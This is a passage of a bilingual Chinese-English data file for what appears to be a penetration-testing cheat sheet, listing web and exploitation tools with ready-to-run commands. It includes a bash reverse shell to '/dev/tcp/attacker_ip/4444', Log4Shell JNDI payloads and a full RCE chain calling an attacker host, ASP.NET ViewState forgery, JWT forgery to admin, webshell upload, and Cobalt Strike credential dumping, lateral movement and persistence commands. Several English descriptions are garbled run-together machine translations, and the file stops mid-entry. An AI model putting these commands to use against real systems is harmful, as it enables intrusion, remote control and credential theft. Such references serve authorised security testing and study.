        name: { zh: '指定测试插件', en: 'Specify Test Plugin' },
        command: 'nikto -h target.com -Plugins "apache_expect_xss;outdated"',
        description: { zh: '仅运行指定的测试插件', en: 'Run only specified test plugins' },
        platform: 'all'
      },
      {
        name: { zh: '输出报告', en: 'Output Report' },
        command: 'nikto -h target.com -o report.html -Format htm',
        description: { zh: '输出HTML格式报告', en: 'Output HTML format report' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/sullo/nikto']
  },
  {
    id: 'zap',
    name: 'OWASP ZAP',
    description: { zh: 'OWASP官方Web应用安全测试平台', en: 'OWASP official web application security testing platform' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: { zh: '下载: https://www.zaproxy.org/download/ / snap install zaproxy / docker pull ghcr.io/zaproxy/zaproxy', en: 'Download: https://www.zaproxy.org/download/ / snap install zaproxy / docker pull ghcr.io/zaproxy/zaproxy' },
    commands: [
      {
        name: { zh: '自动扫描', en: 'Auto Scan' },
        command: 'zap-cli quick-scan -s all -r https://target.com\n# 或使用API\ncurl "http://localhost:8080/JSON/ascan/action/scan/?url=https://target.com"',
        description: { zh: '快速自动化漏洞扫描', en: 'Fast automated vulnerability scan' },
        platform: 'all'
      },
      {
        name: { zh: 'API扫描', en: 'API Scan' },
        command: 'zap-api-scan.py -t https://target.com/api/swagger.json -f openapi',
        description: { zh: '根据OpenAPI规范扫描API', en: 'Scan APIs based on OpenAPI specification' },
        platform: 'all'
      },
      {
        name: { zh: '被动扫描', en: 'Passive Scan' },
        command: '# 配置ZAP为代理(默认8080端口)\n# 浏览器配置代理后正常浏览\n# ZAP自动进行被动漏洞检测',
        description: { zh: '代理模式被动扫描', en: 'Passive scan via proxy mode' },
        platform: 'all'
      },
      {
        name: { zh: 'Docker自动化', en: 'Docker Automation' },
        command: 'docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://target.com -r report.html',
        description: { zh: '使用Docker容器化运行基线扫描', en: 'Run baseline scan using Docker' },
        platform: 'all'
      }
    ],
    references: ['https://www.zaproxy.org/']
  },
  {
    id: 'arjun',
    name: 'Arjun',
    description: { zh: 'HTTP参数发现工具，发现隐藏的GET/POST参数', en: 'HTTP parameter discovery tool for finding hidden GET/POST parameters' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip3 install arjun',
    commands: [
      {
        name: { zh: 'GET参数发现', en: 'GET Parameter Discovery' },
        command: 'arjun -u https://target.com/page',
        description: { zh: '发现隐藏的GET参数', en: 'DiscoverHidden GETParameter' },
        syntaxBreakdown: [
          { part: 'arjun', explanation: { zh: 'HTTP参数发现工具', en: 'HTTP parameter discovery tool' }, type: 'command' },
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'POST参数发现', en: 'POST Parameter Discovery' },
        command: 'arjun -u https://target.com/api -m POST --include="Content-Type: application/json"',
        description: { zh: '发现POST请求的隐藏参数', en: 'DiscoverPOSTRequest HiddenParameter' },
        platform: 'all'
      },
      {
        name: { zh: '自定义字典', en: 'Custom Wordlist' },
        command: 'arjun -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt',
        description: { zh: '使用自定义参数字典', en: 'Use a custom parameter wordlist' },
        platform: 'all'
      },
      {
        name: { zh: '批量扫描', en: 'Batch Scan' },
        command: 'arjun -i urls.txt -o results.json --stable',
        description: { zh: '批量扫描多个URL，稳定模式', en: 'Batch scan multiple URLs in stable mode' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/s0md3v/Arjun']
  },
  {
    id: 'wfuzz',
    name: 'WFuzz',
    description: { zh: 'Web应用模糊测试工具，用于暴力破解参数、目录、认证等', en: 'Web application fuzzing tool for parameters, directories, and authentication' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip3 install wfuzz',
    commands: [
      {
        name: { zh: '目录Fuzz', en: 'Directory Fuzz' },
        command: 'wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 https://target.com/FUZZ',
        description: { zh: '目录暴力破解，隐藏404', en: 'DirectoryBrute Force, Hidden404' },
        syntaxBreakdown: [
          { part: '-c', explanation: { zh: '彩色输出', en: 'Colorized output' }, type: 'parameter' },
          { part: '-z file,wordlist', explanation: { zh: '指定字典文件作为payload', en: 'Specify wordlist file as payload' }, type: 'parameter' },
          { part: '--hc 404', explanation: { zh: '隐藏404响应', en: 'Hidden404Response' }, type: 'parameter' },
          { part: 'FUZZ', explanation: { zh: 'Payload注入点占位符', en: 'Payload injection point placeholder' }, type: 'variable' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '参数Fuzz', en: 'Parameter Fuzz' },
        command: 'wfuzz -c -z file,params.txt --hh 0 "https://target.com/api?FUZZ=test"',
        description: { zh: '参数名Fuzz，隐藏空响应', en: 'Fuzz parameter names, hide empty responses' },
        platform: 'all'
      },
      {
        name: { zh: '认证爆破', en: 'Authentication Brute Force' },
        command: 'wfuzz -c -z file,users.txt -z file,passwords.txt --hc 403 -d "user=FUZZ&pass=FUZ2Z" https://target.com/login',
        description: { zh: '双字典组合爆破登录', en: 'Dual-dictionary combined brute-force login' },
        platform: 'all'
      },
      {
        name: { zh: '子域名Fuzz', en: 'Subdomain Fuzz' },
        command: 'wfuzz -c -z file,subs.txt --hc 404 -H "Host: FUZZ.target.com" https://target.com',
        description: { zh: 'Host头注入方式枚举子域名', en: 'Enumerate subdomains via Host header injection' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/xmendez/wfuzz']
  },
  {
    id: 'commix',
    name: 'Commix',
    description: { zh: '自动化命令注入漏洞检测和利用工具', en: 'Automated command injection detection and exploitation tool' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install commix / pip3 install commix / git clone https://github.com/commixproject/commix',
    commands: [
      {
        name: { zh: '自动检测', en: 'Auto Detection' },
        command: 'commix --url="https://target.com/page?cmd=test"',
        description: { zh: '自动检测命令注入点', en: 'Auto DetectionCommand Injectionpoint' },
        syntaxBreakdown: [
          { part: 'commix', explanation: { zh: '命令注入自动化工具', en: 'Automated command injection tool' }, type: 'command' },
          { part: '--url', explanation: { zh: '目标URL(参数中含注入点)', en: 'Target URL (parameter contains injection point)' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定参数', en: 'Specify Parameter' },
        command: 'commix --url="https://target.com/api" --data="host=INJECT_HERE" -p host',
        description: { zh: '指定POST参数进行注入测试', en: 'Test POST parameter for injection' },
        platform: 'all'
      },
      {
        name: { zh: '获取Shell', en: 'Get Shell' },
        command: 'commix --url="https://target.com/page?ip=test" --os-cmd="id"\ncommix --url="https://target.com/page?ip=test" --os-shell',
        description: { zh: '执行系统命令或获取交互式Shell', en: 'Execute system commands or obtain an interactive shell' },
        platform: 'all'
      },
      {
        name: { zh: '绕过WAF', en: 'Bypass WAF' },
        command: 'commix --url="https://target.com/page?cmd=test" --tamper=base64encode --technique=t',
        description: { zh: '使用编码绕过和时间盲注技术', en: 'UseEncoding Bypass and Time-Based Blind InjectionTechnique' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/commixproject/commix']
  },
  {
    id: 'dalfox',
    name: 'Dalfox',
    description: { zh: '基于Go的高性能XSS漏洞扫描和参数分析工具', en: 'High-performance Go-based XSS vulnerability scanner with parameter analysis' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'go install github.com/hahwul/dalfox/v2@latest',
    commands: [
      {
        name: { zh: 'URL扫描', en: 'URL Scan' },
        command: 'dalfox url "https://target.com/search?q=test"',
        description: { zh: '扫描单个URL的XSS漏洞', en: 'ScansingleURL XSSVulnerability' },
        syntaxBreakdown: [
          { part: 'dalfox', explanation: { zh: 'XSS漏洞扫描工具', en: 'XSS vulnerability scanner' }, type: 'command' },
          { part: 'url', explanation: { zh: '单URL扫描模式', en: 'Single URL scan mode' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '管道批量', en: 'Pipeline Batch' },
        command: 'cat urls.txt | dalfox pipe --silence --only-poc',
        description: { zh: '批量扫描，仅输出POC', en: 'Batch scan, output POC only' },
        platform: 'all'
      },
      {
        name: { zh: '自定义Payload', en: 'Custom Payload' },
        command: 'dalfox url "https://target.com/q=test" --custom-payload payloads.txt --waf-evasion',
        description: { zh: '使用自定义Payload并启用WAF绕过', en: 'UseCustom Payload and EnableWAF Bypass' },
        platform: 'all'
      },
      {
        name: 'Blind XSS',
        command: 'dalfox url "https://target.com/q=test" --blind https://your-xss-hunter.com',
        description: { zh: '使用Blind XSS回调检测', en: 'UseBlind XSSCallbackDetection' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/hahwul/dalfox']
  },
  {
    id: 'xsstrike',
    name: 'XSStrike',
    description: { zh: '高级XSS检测工具，支持反射/存储/DOM型XSS检测', en: 'AdvancedXSSDetectionTools, supportsReflection/storage/DOM-Based XSSDetection' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/s0md3v/XSStrike && pip3 install -r requirements.txt',
    commands: [
      {
        name: { zh: '基础扫描', en: 'Basic Scan' },
        command: 'python3 xsstrike.py -u "https://target.com/search?q=test"',
        description: { zh: '扫描反射型XSS', en: 'Scan for reflected XSS' },
        platform: 'all'
      },
      {
        name: { zh: 'POST方式', en: 'POST Method' },
        command: 'python3 xsstrike.py -u "https://target.com/comment" --data "content=test" --method POST',
        description: { zh: '测试POST参数的XSS', en: 'Test POST parameters for XSS' },
        platform: 'all'
      },
      {
        name: { zh: '模糊测试', en: 'Fuzz Testing' },
        command: 'python3 xsstrike.py -u "https://target.com/q=test" --fuzzer',
        description: { zh: '使用模糊测试模式发现过滤规则', en: 'Use fuzzing mode to discover filter rules' },
        platform: 'all'
      },
      {
        name: { zh: '爬虫模式', en: 'Crawler Mode' },
        command: 'python3 xsstrike.py -u "https://target.com" --crawl -l 3',
        description: { zh: '爬取3层深度的所有页面并测试XSS', en: 'Crawl all pages 3 levels deep and test for XSS' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/s0md3v/XSStrike']
  },
  {
    id: 'gopherus',
    name: 'Gopherus',
    description: { zh: '生成Gopher协议Payload，用于SSRF攻击内部服务', en: 'Generate Gopher protocol payloads to attack internal services via SSRF' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/tarunkant/Gopherus && pip install -r requirements.txt',
    commands: [
      {
        name: 'MySQL Payload',
        command: 'python2 gopherus.py --exploit mysql\n# 输入SQL查询语句后生成gopher://payload',
        description: { zh: '生成攻击MySQL的Gopher Payload', en: 'Generate Gopher payload to attack MySQL' },
        syntaxBreakdown: [
          { part: '--exploit mysql', explanation: { zh: '指定目标服务类型', en: 'Specify target service type' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: 'Redis Payload',
        command: 'python2 gopherus.py --exploit redis\n# 可生成写入webshell/计划任务/SSH密钥等payload',
        description: { zh: '生成攻击Redis的Gopher Payload', en: 'Generate Gopher payload to attack Redis' },
        platform: 'all'
      },
      {
        name: 'FastCGI Payload',
        command: 'python2 gopherus.py --exploit fastcgi\n# 输入要执行的命令',
        description: { zh: '生成攻击PHP-FPM/FastCGI的Payload', en: 'Generate payload to attack PHP-FPM/FastCGI' },
        platform: 'all'
      },
      {
        name: 'SMTP Payload',
        command: 'python2 gopherus.py --exploit smtp',
        description: { zh: '生成通过SMTP发送邮件的Payload', en: 'Generate a payload that sends email via SMTP' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/tarunkant/Gopherus']
  },
  {
    id: 'smuggler',
    name: 'Smuggler',
    description: { zh: 'HTTP请求走私漏洞检测工具', en: 'HTTP request smuggling vulnerability detection tool' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/defparam/smuggler && pip3 install -r requirements.txt',
    commands: [
      {
        name: { zh: '自动检测', en: 'Auto Detection' },
        command: 'python3 smuggler.py -u https://target.com',
        description: { zh: '自动检测HTTP请求走私漏洞', en: 'Auto DetectionHTTPRequest SmugglingVulnerability' },
        syntaxBreakdown: [
          { part: 'smuggler.py', explanation: { zh: 'HTTP走私检测脚本', en: 'HTTP smuggling detection script' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定技术', en: 'Specify Technique' },
        command: 'python3 smuggler.py -u https://target.com -t CL.TE',
        description: { zh: '测试CL.TE类型的请求走私', en: 'TestCL.TEType Request Smuggling' },
        platform: 'all'
      },
      {
        name: { zh: '批量测试', en: 'Batch Testing' },
        command: 'cat urls.txt | python3 smuggler.py',
        description: { zh: '从标准输入读取URL批量测试', en: 'Read URLs from stdin for batch testing' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/defparam/smuggler']
  },
  {
    id: 'jwt-tool',
    name: 'JWT Tool',
    description: { zh: 'JSON Web Token安全测试工具，支持伪造/破解/注入', en: 'JWT security testing tool supporting forging, cracking, and injection' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip3 install jwt_tool / git clone https://github.com/ticarpi/jwt_tool',
    commands: [
      {
        name: { zh: '解析Token', en: 'Parse Token' },
        command: 'jwt_tool eyJhbGciOi...',
        description: { zh: '解析并显示JWT的Header和Payload', en: 'Parse and DisplayJWT Header and Payload' },
        syntaxBreakdown: [
          { part: 'jwt_tool', explanation: { zh: 'JWT安全测试工具', en: 'JWT security test tool' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '全自动攻击', en: 'Full Auto Attack' },
        command: 'jwt_tool -t https://target.com/api -rh "Authorization: Bearer eyJ..." -M at',
        description: { zh: '自动尝试所有已知JWT攻击', en: 'Automatically attempt all known JWT attacks' },
        platform: 'all'
      },
      {
        name: { zh: 'None算法攻击', en: 'None Algorithm Attack' },
        command: 'jwt_tool eyJhbGciOi... -X a',
        description: { zh: '尝试将算法改为none绕过验证', en: 'Attempt to change the algorithm to none to bypass verification' },
        platform: 'all'
      },
      {
        name: { zh: '密钥暴力破解', en: 'Key Brute Force' },
        command: 'jwt_tool eyJhbGciOi... -C -d /usr/share/wordlists/rockyou.txt',
        description: { zh: '暴力破解HMAC密钥', en: 'Brute ForceHMACkey' },
        platform: 'all'
      },
      {
        name: { zh: '伪造Token', en: 'Forge Token' },
        command: 'jwt_tool eyJhbGciOi... -S hs256 -p "secret_key" -I -pc role -pv admin',
        description: { zh: '使用已知密钥伪造Token，修改角色为admin', en: 'Forge token using known key, modify role to admin' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/ticarpi/jwt_tool']
  },
  {
    id: 'graphqlmap',
    name: 'GraphQLmap',
    description: { zh: 'GraphQL API渗透测试工具，支持自省查询和注入', en: 'GraphQL API penetration testing tool with introspection query and injection support' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/swisskyrepo/GraphQLmap && pip3 install -r requirements.txt',
    commands: [
      {
        name: { zh: '自省查询', en: 'Introspection Query' },
        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x dump_schema',
        description: { zh: '通过自省查询导出完整Schema', en: 'Export complete schema via introspection query' },
        platform: 'all'
      },
      {
        name: { zh: '字段枚举', en: 'Field Enumeration' },
        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x enum',
        description: { zh: '枚举所有可用的Query/Mutation字段', en: 'Enumerate all available Query/Mutation fields' },
        platform: 'all'
      },
      {
        name: { zh: 'SQL注入', en: 'SQL Injection' },
        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x nosqli',
        description: { zh: '测试GraphQL参数的注入漏洞', en: 'Test GraphQL parameters for injection vulnerabilities' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/swisskyrepo/GraphQLmap']
  },
  {
    id: 'cadaver',
    name: 'Cadaver',
    description: { zh: 'WebDAV客户端工具，用于测试WebDAV服务', en: 'WebDAV client tool for testing WebDAV services' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install cadaver',
    commands: [
      {
        name: { zh: '连接WebDAV', en: 'Connect WebDAV' },
        command: 'cadaver https://target.com/webdav/',
        description: { zh: '连接到WebDAV服务器', en: 'Connection to WebDAVServer' },
        platform: 'linux'
      },
      {
        name: { zh: '上传文件', en: 'Upload File' },
        command: '# 在cadaver交互式Shell中:\nput shell.aspx\nmput *.txt',
        description: { zh: '上传Webshell或文件到WebDAV目录', en: 'UploadWebshell or File to WebDAVDirectory' },
        platform: 'linux'
      },
      {
        name: { zh: '列出和下载', en: 'List and Download' },
        command: '# cadaver Shell:\nls\nget config.xml\nmget *.bak',
        description: { zh: '列出目录内容并下载文件', en: 'List DirectoryContent and Download File' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/notroj/cadaver']
  },
  {
    id: 'searchsploit',
    name: 'Searchsploit',
    description: { zh: 'Exploit-DB本地搜索工具，离线查找漏洞利用代码', en: 'Exploit-DB local search tool for offline exploit code lookup' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: 'apt install exploitdb / searchsploit -u (更新数据库)', en: 'apt install exploitdb / searchsploit -u (Update Database)' },
    commands: [
      {
        name: { zh: '搜索漏洞', en: 'Search Exploits' },
        command: 'searchsploit apache 2.4\nsearchsploit wordpress 5.0',
        description: { zh: '按关键词搜索漏洞利用', en: 'Search exploits by keyword' },
        syntaxBreakdown: [
          { part: 'searchsploit', explanation: { zh: 'Exploit-DB本地搜索工具', en: 'Exploit-DB local search tool' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '精确搜索', en: 'Exact Search' },
        command: 'searchsploit -e "Apache Tomcat"\nsearchsploit --exclude="dos" windows smb',
        description: { zh: '精确匹配和排除关键词', en: 'Exact match and exclude keywords' },
        platform: 'all'
      },
      {
        name: { zh: '复制利用代码', en: 'Copy Exploit Code' },
        command: 'searchsploit -m 44228\nsearchsploit -p 44228',
        description: { zh: '复制exploit到当前目录或显示路径', en: 'Copyexploit to currentDirectory or DisplayPath' },
        platform: 'all'
      },
      {
        name: { zh: 'JSON输出', en: 'JSON Output' },
        command: 'searchsploit -j apache | jq ".RESULTS_EXPLOIT[]"',
        description: { zh: 'JSON格式输出便于脚本处理', en: 'JSON format output for script processing' },
        platform: 'all'
      }
    ],
    references: ['https://www.exploit-db.com/searchsploit']
  },
  {
    id: 'exploitdb',
    name: 'ExploitDB',
    description: { zh: '漏洞利用代码数据库在线搜索', en: 'Online exploit code database search' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: '在线使用: https://www.exploit-db.com / 本地: searchsploit', en: 'Online: https://www.exploit-db.com / Local: searchsploit' },
    commands: [
      {
        name: { zh: '在线搜索', en: 'Online Search' },
        command: '# 访问 https://www.exploit-db.com\n# 搜索框输入: Apache Struts\n# 或使用Google Dork:\nsite:exploit-db.com "Apache Struts" RCE',
        description: { zh: '在线搜索漏洞利用代码', en: 'Search online for exploit code' },
        platform: 'all'
      },
      {
        name: { zh: 'API查询', en: 'API Query' },
        command: 'curl "https://www.exploit-db.com/search?q=wordpress+5.0" -H "X-Requested-With: XMLHttpRequest"',
        description: { zh: '通过API搜索(需要合适的请求头)', en: 'Search via API (requires appropriate request headers)' },
        platform: 'all'
      },
      {
        name: 'Google Hacking',
        command: '# ExploitDB收录的Google Dorks:\nhttps://www.exploit-db.com/google-hacking-database\n# 搜索泄露的配置文件、数据库等',
        description: { zh: '使用ExploitDB的Google Hacking数据库', en: 'Use ExploitDB Google Hacking Database' },
        platform: 'all'
      }
    ],
    references: ['https://www.exploit-db.com']
  },
  {
    id: 'ysoserial',
    name: 'ysoserial',
    description: { zh: 'Java反序列化漏洞利用Payload生成工具', en: 'Java deserialization exploitation payload generator' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: 'java -jar ysoserial.jar / 下载: https://github.com/frohoff/ysoserial/releases', en: 'java -jar ysoserial.jar / Download: https://github.com/frohoff/ysoserial/releases' },
    commands: [
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: 'java -jar ysoserial.jar CommonsCollections1 "id" | base64\njava -jar ysoserial.jar CommonsCollections5 "whoami" > payload.bin',
        description: { zh: '使用指定Gadget Chain生成反序列化Payload', en: 'Generate deserialization payload using a specified gadget chain' },
        syntaxBreakdown: [
          { part: 'CommonsCollections1', explanation: { zh: 'Gadget Chain名称(依赖目标classpath)', en: 'Gadget chain name (depends on target classpath)' }, type: 'parameter' },
          { part: '"id"', explanation: { zh: '要执行的系统命令', en: 'NeedExecute System Commands' }, type: 'value' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '列出Gadget', en: 'List Gadgets' },
        command: 'java -jar ysoserial.jar --help\n# 常用: CommonsCollections1-7, Jdk7u21, URLDNS, JRMPClient',
        description: { zh: '列出所有可用的Gadget Chain', en: 'List all available gadget chains' },
        platform: 'all'
      },
      {
        name: { zh: 'JRMP攻击', en: 'JRMP Attack' },
        command: '# 监听端(攻击机):\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "bash -c {echo,base64_cmd}|{base64,-d}|{bash,-i}"\n\n# 发送JRMP客户端Payload:\njava -jar ysoserial.jar JRMPClient attacker_ip:1099 > jrmp.bin',
        description: { zh: '通过JRMP协议进行远程利用', en: 'Remote exploitation via JRMP protocol' },
        platform: 'all'
      },
      {
        name: { zh: 'URLDNS探测', en: 'URLDNS Probing' },
        command: 'java -jar ysoserial.jar URLDNS "http://your_dnslog.com/test" | base64',
        description: { zh: '使用URLDNS链探测反序列化漏洞(无需依赖)', en: 'Use URLDNS chain to detect deserialization vulnerabilities (no dependencies required)' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/frohoff/ysoserial']
  },
  {
    id: 'ysoserial-net',
    name: 'ysoserial.net',
    description: { zh: '.NET反序列化Payload生成工具', en: '.NET deserialization payload generator' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: '下载: https://github.com/pwntester/ysoserial.net/releases', en: 'Download: https://github.com/pwntester/ysoserial.net/releases' },
    commands: [
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: 'ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc" -o base64',
        description: { zh: '生成.NET反序列化Payload', en: 'Generate .NET deserialization payload' },
        syntaxBreakdown: [
          { part: '-g', explanation: { zh: 'Gadget Chain名称', en: 'Gadget chain name' }, type: 'parameter' },
          { part: '-f', explanation: { zh: '序列化格式(BinaryFormatter/ObjectStateFormatter等)', en: 'Serialization format (BinaryFormatter/ObjectStateFormatter, etc.)' }, type: 'parameter' },
          { part: '-c', explanation: { zh: '要执行的命令', en: 'NeedExecute Command' }, type: 'parameter' },
          { part: '-o base64', explanation: { zh: 'Base64编码输出', en: 'Base64 EncodingOutput' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: 'ViewState攻击', en: 'ViewState Attack' },
        command: 'ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg=SHA1 --validationkey=MACHINE_KEY --generator=GENERATOR',
        description: { zh: '伪造ASP.NET ViewState执行命令', en: 'Forge ASP.NET ViewState to execute commands' },
        platform: 'windows'
      },
      {
        name: { zh: '列出可用链', en: 'List Available Chains' },
        command: 'ysoserial.exe -l\n# 常用: TextFormattingRunProperties, TypeConfuseDelegate, PSObject',
        description: { zh: '列出所有可用的Gadget Chain和格式', en: 'List all available gadget chains and formats' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/pwntester/ysoserial.net']
  },
  {
    id: 'marshalsec',
    name: 'Marshalsec',
    description: { zh: 'Java反序列化利用工具，支持多种Marshal格式和JNDI注入', en: 'Java deserialization tool supporting multiple marshal formats and JNDI injection' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/mbechler/marshalsec && mvn clean package -DskipTests',
    commands: [
      {
        name: { zh: 'LDAP服务器', en: 'LDAP Server' },
        command: 'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker_ip:8888/#Exploit" 1389',
        description: { zh: '启动恶意LDAP服务器用于JNDI注入(Log4Shell等)', en: 'Start a malicious LDAP server for JNDI injection (Log4Shell, etc.)' },
        syntaxBreakdown: [
          { part: 'LDAPRefServer', explanation: { zh: '启动LDAP Reference服务器', en: 'StartLDAP ReferenceServer' }, type: 'command' },
          { part: '"http://attacker_ip:8888/#Exploit"', explanation: { zh: '恶意class文件托管URL', en: 'Malicious class file hosting URL' }, type: 'value' },
          { part: '1389', explanation: { zh: 'LDAP服务监听端口', en: 'LDAP service listening port' }, type: 'value' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'RMI服务器', en: 'RMI Server' },
        command: 'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://attacker_ip:8888/#Exploit" 1099',
        description: { zh: '启动恶意RMI服务器', en: 'Start a malicious RMI server' },
        platform: 'all'
      },
      {
        name: { zh: '配合Log4Shell', en: 'Combined with Log4Shell' },
        command: '# 1. 编译恶意class: javac Exploit.java\n# 2. 托管class: python3 -m http.server 8888\n# 3. 启动LDAP: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ip:8888/#Exploit" 1389\n# 4. 触发: ${jndi:ldap://ip:1389/Exploit}',
        description: { zh: '配合Log4j2 RCE完整利用链', en: 'Complete Log4j2 RCE exploitation chain' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/mbechler/marshalsec']
  },
  {
    id: 'jndi-exploit',
    name: 'JNDIExploit',
    description: { zh: 'JNDI注入利用工具，集成多种Gadget和Bypass', en: 'JNDI injection exploitation tool with multiple gadgets and bypasses' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/feihong-cs/JNDIExploit && mvn clean package',
    commands: [
      {
        name: { zh: '启动服务', en: 'Start Service' },
        command: 'java -jar JNDIExploit.jar -i attacker_ip',
        description: { zh: '启动JNDI Exploit服务(同时监听LDAP 1389和HTTP 3456)', en: 'Start JNDI Exploit service (listen on LDAP 1389 and HTTP 3456)' },
        syntaxBreakdown: [
          { part: '-i', explanation: { zh: '攻击机IP地址', en: 'Attacker machine IP address' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '命令执行', en: 'Command Execution' },
        command: '# 触发Payload:\n${jndi:ldap://attacker_ip:1389/Basic/Command/Base64/Y21k}\n${jndi:ldap://attacker_ip:1389/Basic/ReverseShell/attacker_ip/4444}',
        description: { zh: '通过不同路由执行命令或反弹Shell', en: 'Execute commands or get a reverse shell via various routes' },
        platform: 'all'
      },
      {
        name: { zh: 'Bypass高版本JDK', en: 'Bypass High Version JDK' },
        command: '# 使用Tomcat Bypass:\n${jndi:ldap://attacker_ip:1389/TomcatBypass/Command/Base64/d2hvYW1p}\n# 使用反序列化Bypass:\n${jndi:ldap://attacker_ip:1389/Deserialization/CommonsCollections5/Command/Base64/d2hvYW1p}',
        description: { zh: '绕过高版本JDK的trustURLCodebase限制', en: 'Bypass trustURLCodebase restriction in newer JDK versions' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/feihong-cs/JNDIExploit']
  },
  {
    id: 'rogue-jndi',
    name: 'Rogue JNDI',
    description: { zh: '恶意JNDI服务器，提供多种攻击向量', en: 'Malicious JNDI server providing multiple attack vectors' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/veracode-research/rogue-jndi && mvn package',
    commands: [
      {
        name: { zh: '启动服务', en: 'Start Service' },
        command: 'java -jar RogueJndi.jar --command "whoami" --hostname attacker_ip',
        description: { zh: '启动恶意JNDI服务(LDAP+RMI+HTTP)', en: 'Start malicious JNDI service (LDAP + RMI + HTTP)' },
        platform: 'all'
      },
      {
        name: { zh: '反弹Shell', en: 'Reverse Shell' },
        command: 'java -jar RogueJndi.jar --command "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" --hostname attacker_ip',
        description: { zh: '配置反弹Shell命令', en: 'ConfigurationReverse ShellCommand' },
        platform: 'all'
      },
      {
        name: { zh: '触发利用', en: 'Trigger Exploitation' },
        command: '# LDAP: ${jndi:ldap://attacker_ip:1389/o=reference}\n# RMI: ${jndi:rmi://attacker_ip:1099/o=reference}',
        description: { zh: '在目标注入JNDI Lookup触发利用', en: 'Inject JNDI lookup into target to trigger exploitation' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/veracode-research/rogue-jndi']
  },
  {
    id: 'cobalt-strike',
    name: 'Cobalt Strike',
    description: { zh: '商业化红队C2框架，支持多种攻击和后渗透功能', en: 'Commercial red team C2 framework supporting multiple attack and post-exploitation capabilities' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: '商业软件，需要购买License / 启动: ./teamserver ip password profile.crt', en: 'Commercial software, requires license purchase / Start: ./teamserver ip password profile.crt' },
    commands: [
      {
        name: { zh: '启动Team Server', en: 'Start Team Server' },
        command: './teamserver your_ip your_password malleable_c2_profile.profile',
        description: { zh: '启动CS服务端', en: 'StartCSServer-Side' },
        platform: 'linux'
      },
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: '# GUI操作:\n# Attacks > Packages > Windows Executable (S)\n# Attacks > Packages > HTML Application\n# Attacks > Web Drive-by > Scripted Web Delivery',
        description: { zh: '通过图形界面生成各类Payload', en: 'Generate various payloads via the GUI' },
        platform: 'all'
      },
      {
        name: { zh: '常用Beacon命令', en: 'Common Beacon Commands' },
        command: '# 基础信息\nwhoami\nshell ipconfig\ngetuid\n\n# 横向移动\njump psexec target_ip SMB_listener\njump winrm target_ip HTTP_listener\n\n# 凭证获取\nhashdump\nlogonpasswords\n\n# 持久化\npersist-service\npersist-registry',
